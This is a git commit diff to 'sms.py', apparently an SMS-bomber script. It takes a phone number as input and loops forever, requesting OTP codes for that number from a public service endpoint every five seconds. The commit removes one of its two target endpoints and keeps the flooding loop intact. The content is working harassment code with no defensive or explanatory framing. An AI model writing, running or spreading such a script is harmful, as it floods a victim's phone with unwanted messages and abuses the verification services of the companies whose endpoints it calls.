bb9be9a7a8011ce1acd86012bab9b662f92113d6
aliyazdani04 <98017374+aliyazdani04@users.noreply.github.com>
2022-04-13 02:05:58 +0430

    Update sms.py

--- sms.py
+++ sms.py
@@ -2,7 +2,7 @@ import requests
 from termcolor import colored
 import time
 
-url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
+
 url1 = 'https://filmnet.ir/api-v2/access-token/users/{phonen}/otp'
 
 phonen = input('phone number: ')
@@ -11,7 +11,6 @@ pnd = {'cellphone': f'{phonen}'}
 
 while True:
       time.sleep(5)
-      req = requests.post(url, json= pnd)
       req1 = requests.get(url1)
 
       print(colored('yes', 'red'))
